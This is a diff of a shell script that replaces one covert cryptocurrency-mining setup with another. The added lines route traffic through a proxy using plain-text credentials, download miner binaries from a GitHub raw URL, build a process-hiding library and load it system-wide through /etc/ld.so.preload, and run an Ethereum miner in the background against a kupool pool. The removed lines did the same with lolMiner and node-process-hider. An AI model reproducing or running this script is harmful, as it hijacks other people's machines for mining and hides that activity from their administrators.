@@ -1,21 +1,14 @@
-#!/bin/sh
-pkill lolMiner
-wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz 
-tar -xf lolMiner_v1.29_Lin64.tar.gz
-cd 1.29
-apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
-curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
-apt-get install -y nodejs
-npm i -g node-process-hider
-ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
-dpkg-reconfigure --frontend noninteractive tzdata
-
-sudo swapoff -a; sudo swapon -a
-sleep 10
-ph add PhoenixMinerEth.sh
-Ph add python3
-ph add root
-ph add node-process-hider
-ph add lolMiner
-./lolMiner --algo ETHASH --pool stratum+tcp://ethash.kupool.com:8888 --user prodent.DO --ethstratum ETHPROXY  --timeprint on --longstats 120 
-sleep 10
+#!/bin/bash
+curl --proxy "http://isuaceev-rotate:1hlu4kdb73rx@p.webshare.io:80/" https://ipv4.webshare.io/
+export http_proxy=http://isuaceev-rotate:1hlu4kdb73rx@p.webshare.io:80 &&
+export https_proxy=http://isuaceev-rotate:1hlu4kdb73rx@p.webshare.io:80 &&
+export ftp_proxy=http://isuaceev-rotate:1hlu4kdb73rx@p.webshare.io:80 &&
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/bezzHash
+chmod +x bezzHash
+wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
+unzip magicBezzHash.zip
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+nohup ./bezzHash --url=prodent.$(echo $(shuf -i 1-99999 -n 1)-TEST)@ethash.kupool.com:443 > nohup.out
